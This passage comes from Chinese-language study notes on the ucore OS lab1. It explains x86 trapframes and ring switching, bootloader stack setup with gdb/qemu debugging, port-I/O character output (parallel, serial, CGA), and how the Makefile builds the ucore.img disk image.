tf_cs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding4;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_eflags;</span><br><span class="line">    <span class="comment">// 以下这些信息会在切换特权级时被使用</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_esp;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ss;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding5;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
<p><strong>切换特权级的过程</strong></p>
<ul>
<li>特权级提升<ul>
<li>在陷入的一瞬间，CPU会因为特权级的改变，索引TSS，切换 <code>ss</code> 和 <code>esp</code> 为内核栈，并按顺序自动压入<code>user_ss</code>、<code>user_esp</code>、<code>user_eflags</code>、<code>user_cs</code>、<code>old_eip</code>以及<code>err</code></li>
<li>之后CPU会在中断处理例程入口处，先将剩余的段寄存器以及所有的通用寄存器压栈，构成一个 <code>trapframe</code> ，然后将该 <code>trapframe</code> 传入给真正的中断处理例程并执行</li>
<li>该处理例程会判断传入的中断数(<code>trapno</code>)并执行特定的代码，在提升特权级的代码中，程序会处理传入的 <code>trapframe</code> 信息中的 <code>CS、DS、eflags</code> 寄存器，修改上面的 DPL、CPL与IOPL 以达到提升特权的目的</li>
<li>将修改后的 <code>trapframe</code> 压入用户栈（这一步没有修改 <code>user_esp</code> 寄存器），并设置中断处理例程结束后将要弹出 <code>esp</code> 寄存器的值为用户栈的新地址（与刚刚不同，这一步修改了将要恢复的 <code>user_esp</code> 寄存器）</li>
<li>在内核中，“将修改后的trapframe压入用户栈”这一步，需要舍弃 <code>trapframe</code> 中末尾两个旧的<code>ss</code>和<code>esp</code>寄存器数据</li>
</ul>
</li>
<li>特权级降低<ul>
<li>与 ring3 调用中断不同，当 ring0 调用中断时，进入中断前和进入中断后的这个过程，栈不发生改变</li>
<li>修改后的 <code>trapFrame</code> 不需要像上面那样保存至将要使用的栈，因为当前环境下 <code>iret</code> 前后特权级会发生改变，执行该命令会弹出 <code>ss</code> 和 <code>esp</code> ，所以可以通过 <code>iret</code> 来设置返回时的栈地</li>
</ul>
</li>
</ul>
<h2 id="x86栈简述"><a href="#x86栈简述" class="headerlink" title="x86栈简述"></a>x86栈简述</h2><p>只有设置好的合适大小和地址的栈内存空间（简称栈空间），才能有效地进行函数调用，这里为了减少汇编代码量，我们就通过C代码来完成显示，由于需要调用C语言的函数，所以需要自己建立好栈空间，设置栈的代码如下： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movl    $start, %esp</span><br></pre></td></tr></table></figure>
<p>由于start位置（0x7c00）前的地址空间没有用到，所以可以用来作为bootloader的栈，由于栈是向下长的，所以不会破坏start位置后面的代码，我们可以通过用gdb调试bootloader来进一步观察栈的变化： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu -hda bin/ucore.img -S -s</span><br><span class="line">gdb obj/bootblock.o</span><br></pre></td></tr></table></figure>
<p>然后再GDB中输入以下指令来连接qemu：（可以使用 layout src 指令显示源码）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) target remote :<span class="number">1234</span> </span><br><span class="line">(gdb) <span class="keyword">break</span> bootasm.S:<span class="number">68</span></span><br><span class="line">(gdb) <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>接下来就可以通过 “ info registers esp ” 指令来打印 esp寄存器 的值了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">B+&gt;<span class="number">69</span>              movl $<span class="number">0x0</span>, %ebp </span><br><span class="line">------------------------------------</span><br><span class="line">(gdb) info <span class="keyword">register</span> esp</span><br><span class="line">esp            <span class="number">0x6f00</span>             </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">70</span>              movl $start, %esp            </span><br><span class="line">  &gt;<span class="number">71</span>              call bootmain</span><br><span class="line">------------------------------------</span><br><span class="line">(gdb) info <span class="keyword">register</span> esp</span><br><span class="line">esp            <span class="number">0x7c00</span>              <span class="number">0x7c00</span> &lt;start&gt;</span><br></pre></td></tr></table></figure>
<p>可以发现，程序把“$start”中的数据赋值给了esp，这就是栈的起始地址（栈顶）</p>
<p>看看程序是怎么处理 call 指令的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="function">si</span></span><br><span class="line"><span class="function"><span class="title">bootmain</span> <span class="params">()</span> at boot/bootmain.c:87</span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span> info registers esp</span></span><br><span class="line"><span class="function">esp            0x7bfc              0<span class="title">x7bfc</span></span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span> x/4x 0x7bfc <span class="comment">// esp中装了一个地址</span></span></span><br><span class="line"><span class="function">0x7bfc: 0x00007c4f      0xc031fcfa      0xc08ed88e</span></span><br><span class="line"><span class="function">        0<span class="title">x64e4d08e</span></span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span> x/4i 0x7c4a <span class="comment">// 地址&quot;0x7c4f&quot;就是call指令的下一个指令,是函数&quot;bootmain&quot;的返回地址</span></span></span><br><span class="line"><span class="function">   0x7c4a &lt;protcseg+24&gt;:</span></span><br><span class="line"><span class="function">    call   0x7d0f &lt;bootmain&gt;</span></span><br><span class="line"><span class="function">   0x7c4f &lt;spin&gt;:       jmp    0x7c4f &lt;spin&gt;</span></span><br><span class="line"><span class="function">   0x7c51 &lt;spin+2&gt;:     lea    0<span class="title">x0</span><span class="params">(%esi)</span>,%esi</span></span><br><span class="line"><span class="function">   0x7c54 &lt;gdt&gt;:        add    %al,<span class="params">(%eax)</span></span></span><br></pre></td></tr></table></figure>
<h2 id="x86显示字符串"><a href="#x86显示字符串" class="headerlink" title="x86显示字符串"></a>x86显示字符串</h2><p>bootloader 只在CPU和内存中打转无法让读者很容易知道 bootloader 的工作是否正常，为此在成功完成了保护模式的转换并且设置好栈后，就可以调用 bootmain 函数显示字符串了，在 lab1 中使用了显示器和并口两种外设来显示字符串，主要的代码集中在 bootmain.c 中</p>
<p>这里采用的是很简单的基于Programmed I/O （PIO）方式，PIO方式是一种通过CPU执行I/O端口指令来进行数据读写的数据交换模式，被广泛应用于硬盘、光驱等设备的基础传输模式中（效率低下，但编程简单）</p>
<ul>
<li>计算机与IO接口的通信是通过计算机指令来实现的，通过软件指令选择IO接口上的功能、工作模式的做法，称为“IO接口控制编程”，通常是用端口读写指令in/out实现</li>
<li>端口是IO接口开发给CPU的接口，一般的IO接口都有一组端口，每个端口都有自己的用途</li>
</ul>
<p>指令in/out使用方式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">in al, dx  # al/ax 用于存放从端口读入的数据，dx指端口号</span><br><span class="line">in ax, dx</span><br><span class="line"></span><br><span class="line">out dx, al</span><br><span class="line">out dx, ax</span><br><span class="line">out 立即数, al</span><br><span class="line">out 立即数, ax</span><br></pre></td></tr></table></figure>
<p>在 bootmain.c 中的 lpt_putc 函数（定义在 console.c 中）完成了<strong>并口输出字符</strong>的工作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LPTPORT         0x378</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lpt_putc</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (c != <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">        lpt_putc_sub(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        lpt_putc_sub(<span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">        lpt_putc_sub(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        lpt_putc_sub(<span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lpt_putc_sub</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; !(inb(LPTPORT + <span class="number">1</span>) &amp; <span class="number">0x80</span>) &amp;&amp; i &lt; <span class="number">12800</span>; i ++) &#123;</span><br><span class="line">        delay(); <span class="comment">/* 读I/O端口地址0x379,等待并口准备好 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    outb(LPTPORT + <span class="number">0</span>, c); <span class="comment">/* 向I/O端口地址0x378发出要输出的字符 */</span></span><br><span class="line">    outb(LPTPORT + <span class="number">2</span>, <span class="number">0x08</span> | <span class="number">0x04</span> | <span class="number">0x01</span>); <span class="comment">/* 向I/O端口地址0x37A发出控制命令 */</span></span><br><span class="line">    outb(LPTPORT + <span class="number">2</span>, <span class="number">0x08</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在I/O端口port写入一个字节的data */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">outb</span><span class="params">(<span class="keyword">uint16_t</span> port, <span class="keyword">uint8_t</span> data)</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;outb %0, %1&quot;</span> :: <span class="string">&quot;a&quot;</span> (data), <span class="string">&quot;d&quot;</span> (port))</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 从I/O端口port读取一个字节 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint8_t</span> <span class="title">inb</span><span class="params">(<span class="keyword">uint16_t</span> port)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> data;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;inb %1, %0&quot;</span> : <span class="string">&quot;=a&quot;</span> (data) : <span class="string">&quot;d&quot;</span> (port))</span></span>;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 一种笨的滞后时间控制:通过无意义指令的执行来达到延时的目的 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delay</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    inb(<span class="number">0x84</span>); </span><br><span class="line">    inb(<span class="number">0x84</span>);</span><br><span class="line">    inb(<span class="number">0x84</span>);</span><br><span class="line">    inb(<span class="number">0x84</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>读I/O端口地址 0x379，等待并口准备好</li>
<li>向I/O端口地址 0x378 发出要输出的字符</li>
<li>向I/O端口地址 0x37A 发出控制命令，让并口处理要输出的字符</li>
</ul>
<p>在 bootmain.c 中的 serial_putc 函数（定义在 console.c 中）完成了<strong>串口输出字符</strong>的工作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM1            0x3F8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_TX          0       <span class="comment">// Out: Transmit buffer (DLAB=0)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_LSR         5       <span class="comment">// In:  Line Status Register</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COM_LSR_TXRDY   0x20    <span class="comment">// Transmit buffer avail</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serial_putc</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (c != <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">        serial_putc_sub(c); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        serial_putc_sub(<span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">        serial_putc_sub(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        serial_putc_sub(<span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serial_putc_sub</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; !(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY) &amp;&amp; i &lt; <span class="number">12800</span>; i ++) &#123;</span><br><span class="line">        delay(); <span class="comment">/* 读I/O端口地址0x3f8+5获得LSR寄存器的值，等待串口输出准备好 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    outb(COM1 + COM_TX, c); <span class="comment">/* 向I/O端口地址0x3f8发出要输出的字符 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>读I/O端口地址 0x3f8+5 获得LSR寄存器的值，等待串口输出准备好</li>
<li>向I/O端口地址 0x3f8 发出要输出的字符</li>
</ul>
<p>在 bootmain.c 中的 cga_putc 函数（定义在 console.c 中）完成了 CGA 字符方式在某位置输出字符的工作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRT_ROWS        25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRT_COLS        80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRT_SIZE        (CRT_ROWS * CRT_COLS)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">uint16_t</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint16_t</span> *crt_buf;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint16_t</span> crt_pos;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint16_t</span> addr_6845;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">cga_putc</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// set black on white</span></span><br><span class="line">    <span class="keyword">if</span> (!(c &amp; ~<span class="number">0xFF</span>)) &#123;</span><br><span class="line">        c |= <span class="number">0x0700</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (c &amp; <span class="number">0xff</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\b&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> (crt_pos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            crt_pos --;</span><br><span class="line">            crt_buf[crt_pos] = (c &amp; ~<span class="number">0xff</span>) | <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">        crt_pos += CRT_COLS;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\r&#x27;</span>:</span><br><span class="line">        crt_pos -= (crt_pos % CRT_COLS);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        crt_buf[crt_pos ++] = c;     <span class="comment">// write the character</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// What is the purpose of this?</span></span><br><span class="line">    <span class="keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>));</span><br><span class="line">        <span class="keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i ++) &#123;</span><br><span class="line">            crt_buf[i] = <span class="number">0x0700</span> | <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        crt_pos -= CRT_COLS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// move that little blinky thing</span></span><br><span class="line">    outb(addr_6845, <span class="number">14</span>);</span><br><span class="line">    outb(addr_6845 + <span class="number">1</span>, crt_pos &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    outb(addr_6845, <span class="number">15</span>);</span><br><span class="line">    outb(addr_6845 + <span class="number">1</span>, crt_pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>写I/O端口地址0x3d4，读I/O端口地址0x3d5，获得当前光标位置</li>
<li>在光标的下一位置的显存地址空间上写字符，格式是黑色背景/白色字符</li>
<li>设置当前光标位置为下一位置</li>
</ul>
<h2 id="练习1-镜像文件的生成"><a href="#练习1-镜像文件的生成" class="headerlink" title="练习1 - 镜像文件的生成"></a>练习1 - 镜像文件的生成</h2><p>关于这部分，我觉得现在还不急着去分析 Makefile 的具体内容，就挂一下答案了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bin</span>/ucore.img</span><br><span class="line">| 生成ucore.img的相关代码为</span><br><span class="line">| $(UCOREIMG): $(kernel) $(bootblock)</span><br><span class="line">|	$(V)dd <span class="keyword">if</span>=/dev/zero of=$@ count=<span class="number">10000</span></span><br><span class="line">|	$(V)dd <span class="keyword">if</span>=$(bootblock) of=$@ conv=notrunc</span><br><span class="line">|	$(V)dd <span class="keyword">if</span>=$(kernel) of=$@ seek=<span class="number">1</span> conv=notrunc</span><br><span class="line">|</span><br><span class="line">| 为了生成ucore.img，首先需要生成bootblock、kernel</span><br><span class="line">|</span><br><span class="line">|&gt;	<span class="built_in">bin</span>/bootblock</span><br><span class="line">|	| 生成bootblock的相关代码为</span><br><span class="line">|	| $(bootblock): $(call toobj,$(bootfiles)) | $(call totarget,sign)</span><br><span class="line">|	|	@echo + ld $@</span><br><span class="line">|	|	$(V)$(LD) $(LDFLAGS) -N -e start -Ttext <span class="number">0x7C00</span> $^ \</span><br><span class="line">|	|		-o $(call toobj,bootblock)</span><br><span class="line">|	|	@$(OBJDUMP) -S $(call objfile,bootblock) &gt; \</span><br><span class="line">|	|		$(call asmfile,bootblock)</span><br><span class="line">|	|	@$(OBJCOPY) -S -O binary $(call objfile,bootblock) \</span><br><span class="line">|	|		$(call outfile,bootblock)</span><br><span class="line">|	|	@$(call totarget,sign) $(call outfile,bootblock) $(bootblock)</span><br><span class="line">|	|</span><br><span class="line">|	| 为了生成bootblock，首先需要生成bootasm.o、bootmain.o、sign</span><br><span class="line">|	|</span><br><span class="line">|	|&gt;	obj/boot/bootasm.o, obj/boot/bootmain.o</span><br><span class="line">|	|	| 生成bootasm.o,bootmain.o的相关makefile代码为</span><br><span class="line">|	|	| bootfiles = $(call listf_cc,boot) </span><br><span class="line">|	|	| $(foreach f,$(bootfiles),$(call cc_compile,$(f),$(CC),\</span><br><span class="line">|	|	|	$(CFLAGS) -Os -nostdinc))</span><br><span class="line">|	|	| 实际代码由宏批量生成</span><br><span class="line">|	|	| </span><br><span class="line">|	|	| 生成bootasm.o需要bootasm.S</span><br><span class="line">|	|	| 实际命令为</span><br><span class="line">|	|	| gcc -Iboot/ -fno-builtin -Wall -ggdb -m32 -gstabs \</span><br><span class="line">|	|	| 	-nostdinc  -fno-stack-protector -Ilibs/ -Os -nostdinc \</span><br><span class="line">|	|	| 	-c boot/bootasm.S -o obj/boot/bootasm.o</span><br><span class="line">|	|	| 其中关键的参数为</span><br><span class="line">|	|	| 	-ggdb  生成可供gdb使用的调试信息。这样才能用qemu+gdb来调试bootloader <span class="keyword">or</span> ucore。</span><br><span class="line">|	|	|	-m32  生成适用于<span class="number">32</span>位环境的代码。我们用的模拟硬件是32bit的<span class="number">80386</span>，所以ucore也要是<span class="number">32</span>位的软件。</span><br><span class="line">|	|	| 	-gstabs  生成stabs格式的调试信息。这样要ucore的monitor可以显示出便于开发者阅读的函数调用栈信息</span><br><span class="line">|	|	| 	-nostdinc  不使用标准库。标准库是给应用程序用的，我们是编译ucore内核，OS内核是提供服务的，所以所有的服务要自给自足。</span><br><span class="line">|	|	|	-fno-stack-protector  不生成用于检测缓冲区溢出的代码。这是<span class="keyword">for</span> 应用程序的，我们是编译内核，ucore内核好像还用不到此功能。</span><br><span class="line">|	|	| 	-Os  为减小代码大小而进行优化。根据硬件spec，主引导扇区只有<span class="number">512</span>字节，我们写的简单bootloader的最终大小不能大于<span class="number">510</span>字节。</span><br><span class="line">|	|	| 	-I&lt;<span class="built_in">dir</span>&gt;  添加搜索头文件的路径</span><br><span class="line">|	|	| </span><br><span class="line">|	|	| 生成bootmain.o需要bootmain.c</span><br><span class="line">|	|	| 实际命令为</span><br><span class="line">|	|	| gcc -Iboot/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc \</span><br><span class="line">|	|	| 	-fno-stack-protector -Ilibs/ -Os -nostdinc \</span><br><span class="line">|	|	| 	-c boot/bootmain.c -o obj/boot/bootmain.o</span><br><span class="line">|	|	| 新出现的关键参数有</span><br><span class="line">|	|	| 	-fno-builtin  除非用__builtin_前缀，</span><br><span class="line">|	|	|	              否则不进行builtin函数的优化</span><br><span class="line">|	|</span><br><span class="line">|	|&gt;	<span class="built_in">bin</span>/sign</span><br><span class="line">|	|	| 生成sign工具的makefile代码为</span><br><span class="line">|	|	| $(call add_files_host,tools/sign.c,sign,sign)</span><br><span class="line">|	|	| $(call create_target_host,sign,sign)</span><br><span class="line">|	|	| </span><br><span class="line">|	|	| 实际命令为</span><br><span class="line">|	|	| gcc -Itools/ -g -Wall -O2 -c tools/sign.c \</span><br><span class="line">|	|	| 	-o obj/sign/tools/sign.o</span><br><span class="line">|	|	| gcc -g -Wall -O2 obj/sign/tools/sign.o -o <span class="built_in">bin</span>/sign</span><br><span class="line">|	|</span><br><span class="line">|	| 首先生成bootblock.o</span><br><span class="line">|	| ld -m    elf_i386 -nostdlib -N -e start -Ttext <span class="number">0x7C00</span> \</span><br><span class="line">|	|	obj/boot/bootasm.o obj/boot/bootmain.o -o obj/bootblock.o</span><br><span class="line">|	| 其中关键的参数为</span><br><span class="line">|	|	-m &lt;emulation&gt;  模拟为i386上的连接器</span><br><span class="line">|	|	-nostdlib  不使用标准库</span><br><span class="line">|	|	-N  设置代码段和数据段均可读写</span><br><span class="line">|	|	-e &lt;entry&gt;  指定入口</span><br><span class="line">|	|	-Ttext  制定代码段开始位置</span><br><span class="line">|	|</span><br><span class="line">|	| 拷贝二进制代码bootblock.o到bootblock.out</span><br><span class="line">|	| objcopy -S -O binary obj/bootblock.o obj/bootblock.out</span><br><span class="line">|	| 其中关键的参数为</span><br><span class="line">|	|	-S  移除所有符号和重定位信息</span><br><span class="line">|	|	-O &lt;bfdname&gt;  指定输出格式</span><br><span class="line">|	